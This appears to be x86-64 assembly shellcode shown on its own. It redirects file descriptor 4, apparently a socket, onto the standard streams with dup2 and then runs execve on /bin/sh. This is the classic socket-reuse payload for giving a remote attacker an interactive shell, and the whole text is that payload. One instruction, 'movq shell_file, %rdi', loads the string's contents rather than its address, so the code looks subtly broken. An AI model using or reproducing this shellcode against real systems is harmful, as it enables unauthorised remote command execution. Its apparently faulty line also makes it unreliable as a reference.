_start:
    xorq %rdi, %rdi
    xorq %rsi, %rsi
    xorq %rbx, %rbx
    xorq %rax, %rax
    movq $4, %rbx
    movq %rbx, %rdi # rdi = 4, rsi = 0
    movb $33, %al
    syscall # dup2(4, 0)
    movb $33, %al
    incq %rsi
    syscall # dup2(4, 1)
    movb $33, %al
    incq %rsi
    syscall # dup2(4, 2)

    movb $59, %al
    movq shell_file, %rdi
    xorb %cl, %cl
    movb %cl, 7(%rdi)
    xorq %rsi, %rsi
    xorq %rdx, %rdx
    syscall # execve("/bin/sh", 0, 0)
shell_file:
    .ascii "/bin/shN"
    
